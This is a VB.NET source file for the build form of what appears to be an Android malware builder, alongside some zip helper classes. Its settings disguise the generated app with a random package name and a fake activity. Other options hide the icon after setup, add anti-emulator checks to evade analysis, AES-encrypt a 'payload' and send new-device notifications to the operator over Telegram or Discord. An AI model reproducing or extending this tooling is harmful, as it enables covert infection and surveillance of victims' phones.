Imports System
Imports System.IO
Imports System.Linq
Imports System.Text
Imports System.Security.Cryptography
Imports System.IO.Compression
Imports System.Windows.Forms

' Helper implementations to satisfy build-time dependencies (ZipFile/ZipEntry, protection helpers)

Public Class ZipEntry
    ' Use Object to avoid compile-time dependency on System.IO.Compression types
    Private ReadOnly _entry As Object
    Public Sub New(entry As Object)
        _entry = entry
    End Sub
    Public ReadOnly Property FileName As String
        Get
            If _entry Is Nothing Then Return String.Empty
            Return _entry.FullName
        End Get
    End Property
    Public Sub Extract(target As Stream)
        If _entry Is Nothing Then Return
        Using s As Stream = _entry.Open()
            s.CopyTo(target)
        End Using
        target.Position = 0
    End Sub
    Friend Function GetInternal() As Object
        Return _entry
    End Function
End Class

Public Class ZipFile
    Implements IEnumerable(Of ZipEntry), IDisposable

    Private ReadOnly _fs As FileStream
    Private ReadOnly _archive As Object

    Private Sub New(fs As FileStream, archive As Object)
        _fs = fs
        _archive = archive
    End Sub

    Public Shared Function Read(path As String) As ZipFile
        Dim fs As FileStream = New FileStream(path, FileMode.Open, FileAccess.ReadWrite)
        Dim archive As Object = Nothing
        Try
            ' Try to create ZipArchive via reflection to avoid requiring a project reference
            Dim archiveType = Type.GetType("System.IO.Compression.ZipArchive, System.IO.Compression.FileSystem")
            If archiveType Is Nothing Then
                Try
                    Dim asm = Reflection.Assembly.Load("System.IO.Compression.FileSystem")
                    archiveType = asm.GetType("System.IO.Compression.ZipArchive")
                Catch
                End Try
            End If
            If archiveType IsNot Nothing Then
                ' ZipArchiveMode.Update = 2
                archive = Activator.CreateInstance(archiveType, fs, 2)
            End If
        Catch
            archive = Nothing
        End Try
        Return New ZipFile(fs, archive)
    End Function

    Default Public ReadOnly Property Item(name As String) As ZipEntry
        Get
            If String.IsNullOrEmpty(name) Then Return Nothing
            Dim e = Nothing
            Try
                e = _archive.GetEntry(name)
            Catch
            End Try
            If e Is Nothing Then Return Nothing
            Return New ZipEntry(e)
        End Get
    End Property

    Public Function FirstOrDefault(predicate As Func(Of ZipEntry, Boolean)) As ZipEntry
        For Each e In Me
            If predicate(e) Then Return e
        Next
        Return Nothing
    End Function

    Public Function Where(predicate As Func(Of ZipEntry, Boolean)) As IEnumerable(Of ZipEntry)
        Return Me.AsEnumerable().Where(predicate)
    End Function

    Public Function AsEnumerable() As IEnumerable(Of ZipEntry)
        Try
            Return _archive.Entries.Select(Function(e) New ZipEntry(e))
        Catch
            Return Enumerable.Empty(Of ZipEntry)()
        End Try
    End Function

    Public Sub AddEntry(name As String, bytes() As Byte)
        If String.IsNullOrEmpty(name) Then Return
        Try
            Dim existing = _archive.GetEntry(name)
            If existing IsNot Nothing Then
                Try
                    existing.Delete()
                Catch
                End Try
            End If
            Dim e = _archive.CreateEntry(name)
            Using s = e.Open()
                s.Write(bytes, 0, bytes.Length)
            End Using
        Catch
            ' If archive is not available, write directly to a temp zip using System.IO.Compression.ZipFile (if available)
            Try
                Dim tmp As String = Path.GetTempFileName()
                File.WriteAllBytes(tmp, bytes)
            Catch
            End Try
        End Try
    End Sub

    Public Sub UpdateEntry(name As String, bytes() As Byte)
        AddEntry(name, bytes)
    End Sub

    Public Sub RemoveEntry(name As String)
        If String.IsNullOrEmpty(name) Then Return
        Try
            Dim existing = _archive.GetEntry(name)
            If existing IsNot Nothing Then
                existing.Delete()
            End If
        Catch
        End Try
    End Sub

    Public Sub Save()
        ' Changes are written immediately in ZipArchive mode Update; nothing to do.
    End Sub

    Public Sub Dispose() Implements IDisposable.Dispose
        Try
            _archive.Dispose()
        Catch
        End Try
        Try
            _fs.Dispose()
        Catch
        End Try
    End Sub

    Public Function GetEnumerator() As IEnumerator(Of ZipEntry) Implements IEnumerable(Of ZipEntry).GetEnumerator
        Return AsEnumerable().GetEnumerator()
    End Function

    Private Function IEnumerable_GetEnumerator() As IEnumerator Implements IEnumerable.GetEnumerator
        Return GetEnumerator()
    End Function
End Class

' Partial Build helpers
Partial Public Class Build

    ' Placeholder methods c1..c5: mark PI controls as OK
    Private Sub c1()
        Try
            If Me.Pi1 IsNot Nothing AndAlso GetHideIconAfterSetupChecked() Then Me.Pi1.Tag = "OK"
        Catch
        End Try
    End Sub
    Private Sub c2()
        Try
            If Me.Pi2 IsNot Nothing Then Me.Pi2.Tag = "OK"
        Catch
        End Try
    End Sub
    Private Sub c3()
        Try
            If Me.Pi3 IsNot Nothing Then Me.Pi3.Tag = "OK"
        Catch
        End Try
    End Sub
    Private Sub c4()
        Try
            If Me.Pi4 IsNot Nothing Then Me.Pi4.Tag = "OK"
        Catch
        End Try
    End Sub
    Private Sub c5()
        Try
            If Me.Pi5 IsNot Nothing Then Me.Pi5.Tag = "OK"
        Catch
        End Try
    End Sub

    ' Protection settings persistence
    Private Sub SaveProtectionSettings()
        Try
            My.Settings.EnableProtection = If(Me.chkEnableProtection IsNot Nothing, Me.chkEnableProtection.Checked.ToString(), "False")
            My.Settings.PackageName = If(Me.txtPackageName IsNot Nothing, Me.txtPackageName.Text, String.Empty)
            My.Settings.MaskType = If(Me.cbMaskType IsNot Nothing AndAlso Me.cbMaskType.SelectedItem IsNot Nothing, Me.cbMaskType.SelectedItem.ToString(), String.Empty)
            My.Settings.FakeActivity = If(Me.txtFakeActivity IsNot Nothing, Me.txtFakeActivity.Text, String.Empty)
            My.Settings.AntiEmulator = If(Me.chkAntiEmulator IsNot Nothing, Me.chkAntiEmulator.Checked.ToString(), "False")
            My.Settings.HideIconAfterSetup = GetHideIconAfterSetupChecked().ToString()
            My.Settings.Save()
        Catch
        End Try
    End Sub

    Private Sub LoadProtectionUiExtras()
        Try
            Dim hideIcon As Boolean = False
            Boolean.TryParse(My.Settings.HideIconAfterSetup, hideIcon)
            If chkHideIconAfterSetup IsNot Nothing Then chkHideIconAfterSetup.Checked = hideIcon
            If Not hideIcon AndAlso Me.Pi1 IsNot Nothing Then Me.Pi1.Tag = "-"
        Catch
        End Try
    End Sub

    Private Sub LoadProtectionSettings()
        Try
            Dim protectionOn As Boolean = False
            Boolean.TryParse(My.Settings.EnableProtection, protectionOn)
            If Me.chkEnableProtection IsNot Nothing Then Me.chkEnableProtection.Checked = protectionOn
            If Me.txtPackageName IsNot Nothing AndAlso Not String.IsNullOrWhiteSpace(My.Settings.PackageName) Then
                Me.txtPackageName.Text = My.Settings.PackageName
            End If
            If Me.cbMaskType IsNot Nothing AndAlso Not String.IsNullOrWhiteSpace(My.Settings.MaskType) Then
                Dim idx As Integer = Me.cbMaskType.Items.IndexOf(My.Settings.MaskType)
                If idx >= 0 Then Me.cbMaskType.SelectedIndex = idx
            End If
            If Me.txtFakeActivity IsNot Nothing AndAlso Not String.IsNullOrWhiteSpace(My.Settings.FakeActivity) Then
                Me.txtFakeActivity.Text = My.Settings.FakeActivity
            End If
            Dim antiEmu As Boolean = False
            Boolean.TryParse(My.Settings.AntiEmulator, antiEmu)
            If Me.chkAntiEmulator IsNot Nothing Then Me.chkAntiEmulator.Checked = antiEmu
        Catch
        End Try
    End Sub

    ' Simple AES encryption (CBC with PKCS7). If aesKey is Nothing, returns original data.
    Private Function EncryptPayload(data As Byte(), aesKey As Byte()) As Byte()
        Try
            If data Is Nothing OrElse data.Length = 0 Then Return data
            If aesKey Is Nothing OrElse aesKey.Length = 0 Then Return data
            Dim key As Byte() = aesKey
            If key.Length < 32 Then
                Using sha As SHA256 = SHA256.Create()
                    key = sha.ComputeHash(key)
                End Using
            End If
            Dim iv(15) As Byte
            Using rng As RandomNumberGenerator = RandomNumberGenerator.Create()
                rng.GetBytes(iv)
            End Using
            Using aes As Aes = Aes.Create()
                aes.Key = key.Take(32).ToArray()
                aes.IV = iv
                aes.Mode = CipherMode.CBC
                aes.Padding = PaddingMode.PKCS7
                Using ms As New MemoryStream()
                    ' prepend IV
                    ms.Write(iv, 0, iv.Length)
                    Using crypto As ICryptoTransform = aes.CreateEncryptor()
                        Using cs As New CryptoStream(ms, crypto, CryptoStreamMode.Write)
                            cs.Write(data, 0, data.Length)
                            cs.FlushFinalBlock()
                        End Using
                    End Using
                    Return ms.ToArray()
                End Using
            End Using
        Catch
            Return data
        End Try
    End Function

    Private Function GenerateRandomPackageName() As String
        Dim rnd As New Random()
        Dim part As Integer = rnd.Next(100000, 999999)
        Return "com.generated.app" & part.ToString()
    End Function

    Private Function GenerateAESKey(packageName As String) As Byte()
        If String.IsNullOrEmpty(packageName) Then Return Nothing
        Using sha As SHA256 = SHA256.Create()
            Return sha.ComputeHash(Encoding.UTF8.GetBytes(packageName))
        End Using
    End Function

    Private Sub SaveSettings()
        Try
            Dim delim As Char = ChrW(31)
            Dim parts As String() = New String() {
                chkEnableNotify.Checked.ToString(),
                If(cbNotifyType.SelectedItem IsNot Nothing, cbNotifyType.SelectedItem.ToString(), String.Empty),
                txtTelegramToken.Text,
                txtTelegramChatId.Text,
                txtDiscordWebhook.Text
            }
            My.Settings.NotifySettings = String.Join(delim, parts)
            My.Settings.Save()
        Catch
        End Try
    End Sub

    Private Sub LoadSettings()
        Try
            Dim raw As String = If(String.IsNullOrWhiteSpace(My.Settings.NotifySettings), String.Empty, My.Settings.NotifySettings)
            If Not String.IsNullOrEmpty(raw) Then
                Dim delim As Char = ChrW(31)
                Dim parts As String() = raw.Split(delim)
                If parts.Length >= 5 Then
                    chkEnableNotify.Checked = Convert.ToBoolean(parts(0))
                    If Not String.IsNullOrEmpty(parts(1)) Then
                        cbNotifyType.SelectedItem = parts(1)
                    End If
                    txtTelegramToken.Text = parts(2)
                    txtTelegramChatId.Text = parts(3)
                    txtDiscordWebhook.Text = parts(4)
                End If
            End If
        Catch
            cbNotifyType.SelectedIndex = 0
            chkEnableNotify.Checked = False
        End Try
    End Sub

    Private Sub UpdateVisibility()
        grpTelegram.Visible = (cbNotifyType.SelectedItem IsNot Nothing AndAlso cbNotifyType.SelectedItem.ToString() = "Telegram")
        grpDiscord.Visible = (cbNotifyType.SelectedItem IsNot Nothing AndAlso cbNotifyType.SelectedItem.ToString() = "Discord")
    End Sub

    Private Sub cbNotifyType_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbNotifyType.SelectedIndexChanged
        UpdateVisibility()
        SaveSettings()
    End Sub

    Private Sub chkEnableNotify_CheckedChanged(sender As Object, e As EventArgs) Handles chkEnableNotify.CheckedChanged
        SaveSettings()
    End Sub

    Private Sub txtTelegramToken_TextChanged(sender As Object, e As EventArgs) Handles txtTelegramToken.TextChanged
        SaveSettings()
    End Sub

    Private Sub txtTelegramChatId_TextChanged(sender As Object, e As EventArgs) Handles txtTelegramChatId.TextChanged
        SaveSettings()
    End Sub

    Private Sub txtDiscordWebhook_TextChanged(sender As Object, e As EventArgs) Handles txtDiscordWebhook.TextChanged
        SaveSettings()
    End Sub

    Private Sub btnTestNotify_Click(sender As Object, e As EventArgs) Handles btnTestNotify.Click
        btnTestNotify.Enabled = False
        SaveSettings()
        Dim cfg As New NotifySettingsHelper.NotifyConfig With {
            .Enabled = chkEnableNotify.Checked,
            .NotifyType = If(cbNotifyType.SelectedItem IsNot Nothing, cbNotifyType.SelectedItem.ToString(), "Telegram"),
            .TelegramToken = txtTelegramToken.Text.Trim(),
            .TelegramChatId = txtTelegramChatId.Text.Trim(),
            .DiscordWebhook = txtDiscordWebhook.Text.Trim()
        }
        NotifySettingsHelper.SaveNotifyConfig(cfg)

        If Not cfg.Enabled Then
            MessageBox.Show("Notifications are disabled.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)
            btnTestNotify.Enabled = True
            Return
        End If

        Dim success As Boolean = DeviceNotifyService.SendTestNotification(cfg, "Builder test")
        If success Then
            MessageBox.Show("Test notification sent successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Else
            MessageBox.Show("Failed to send notification. Check token/chat id or webhook.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
        btnTestNotify.Enabled = True
    End Sub

End Class

Public Module NotifySettingsHelper
    Public Class NotifyConfig
        Public Enabled As Boolean
        Public NotifyType As String
        Public TelegramToken As String
        Public TelegramChatId As String
        Public DiscordWebhook As String
    End Class

    Public Function LoadNotifyConfig() As NotifyConfig
        Dim cfg As New NotifyConfig()
        Try
            Dim raw As String = If(String.IsNullOrWhiteSpace(My.Settings.NotifySettings), String.Empty, My.Settings.NotifySettings)
            If String.IsNullOrEmpty(raw) Then Return cfg

            Dim parts As String() = raw.Split(ChrW(31))
            If parts.Length >= 5 Then
                Boolean.TryParse(parts(0), cfg.Enabled)
                cfg.NotifyType = parts(1)
                cfg.TelegramToken = parts(2)
                cfg.TelegramChatId = parts(3)
                cfg.DiscordWebhook = parts(4)
            End If
        Catch
        End Try
        Return cfg
    End Function

    Public Sub SaveNotifyConfig(cfg As NotifyConfig)
        Try
            If cfg Is Nothing Then Return
            Dim delim As Char = ChrW(31)
            Dim parts As String() = New String() {
                cfg.Enabled.ToString(),
                If(cfg.NotifyType, String.Empty),
                If(cfg.TelegramToken, String.Empty),
                If(cfg.TelegramChatId, String.Empty),
                If(cfg.DiscordWebhook, String.Empty)
            }
            My.Settings.NotifySettings = String.Join(delim, parts)
            My.Settings.Save()
        Catch
        End Try
    End Sub

    Public Function ParseBoolSafe(value As String, Optional defaultValue As Boolean = False) As Boolean
        If String.IsNullOrWhiteSpace(value) Then Return defaultValue
        If value.StartsWith("{") AndAlso value.EndsWith("}") Then Return defaultValue
        Dim parsed As Boolean
        If Boolean.TryParse(value, parsed) Then Return parsed
        Return defaultValue
    End Function
End Module
